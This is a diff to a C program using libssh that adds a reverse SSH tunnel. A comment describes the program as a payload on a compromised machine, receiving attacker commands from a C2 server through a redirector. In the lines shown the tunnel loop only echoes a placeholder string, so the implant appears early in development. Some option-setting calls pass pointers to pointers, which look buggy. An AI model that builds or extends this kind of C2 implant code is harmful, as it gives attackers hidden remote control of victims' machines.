@@ -2,9 +2,51 @@
 #include <stdlib.h>
 #include <stdio.h>
 
+int lastReturnCode = SSH_OK;
+
+enum DataTransferType
+{
+    FILE_TRANSFER = 0
+};
+
 void shutdownSession(ssh_session sesh) {
     ssh_disconnect(sesh);
     ssh_free(sesh);
+}
+
+void setupSSHOptions(ssh_session sesh, const char *host, int *port, int *verbosity) {
+    ssh_options_set(sesh, SSH_OPTIONS_HOST, host);
+    ssh_options_set(sesh, SSH_OPTIONS_LOG_VERBOSITY, &verbosity);
+    ssh_options_set(sesh, SSH_OPTIONS_PORT, &port);
+}
+
+// We implement a reverse tunnel; this allows the C2 server to forward SSH input from the attacker's 
+// machine/UI, to the compromised machine:
+// payload <======reverse tunnel(via redirector)======C2 server<----SSH commands------attacker laptop/C2 UI
+ssh_channel openSSHTunnel(ssh_session sesh, int remotePort, int destPort) {
+    ssh_channel tunnelChannel;
+    int returnCode;
+
+    returnCode = ssh_channel_listen_forward(sesh, "localhost", remotePort, NULL);
+
+    if(returnCode != SSH_OK) {
+        returnCode = SSH_ERROR;
+        fprintf(stderr, "*** ERROR: Failed to open remote port: %s***\n", ssh_get_error(sesh));
+        exit(-1);
+    } 
+    
+    else {
+        tunnelChannel = ssh_channel_accept_forward(sesh, 60000, &destPort);
+    }
+
+    lastReturnCode = returnCode;
+
+    return tunnelChannel;
+}
+
+void closeChannel(ssh_channel channel) {
+    ssh_channel_send_eof(channel);
+    ssh_channel_free(channel);
 }
 
 int main(int argc, char **argv) {
@@ -27,6 +69,7 @@ int main(int argc, char **argv) {
     }
 
     // TODO: pass in host as argument
+    //setupSSHOptions(sesh, "localhost", &port, &verbosity);
     ssh_options_set(sesh, SSH_OPTIONS_HOST, "localhost");
     ssh_options_set(sesh, SSH_OPTIONS_LOG_VERBOSITY, &verbosity);
     ssh_options_set(sesh, SSH_OPTIONS_PORT, &port);
@@ -53,6 +96,25 @@ int main(int argc, char **argv) {
     }
 
     printf("Authenticated with the Server\n");
+
+    ssh_channel tunnelChannel = openSSHTunnel(sesh, 9090, 8080);
+    
+    while(1) {
+        char buff[256];
+        int numRead = ssh_channel_read(tunnelChannel, buff, sizeof(buff), 0);
+
+        if(numRead <= 0) {
+            continue;
+        }
+
+        int numWritten = ssh_channel_write(tunnelChannel, "hihi\n", numRead);
+
+        printf("Sent\n");
+    }
+
+    if(tunnelChannel) {
+        closeChannel(tunnelChannel);
+    }
 
     shutdownSession(sesh);
 }
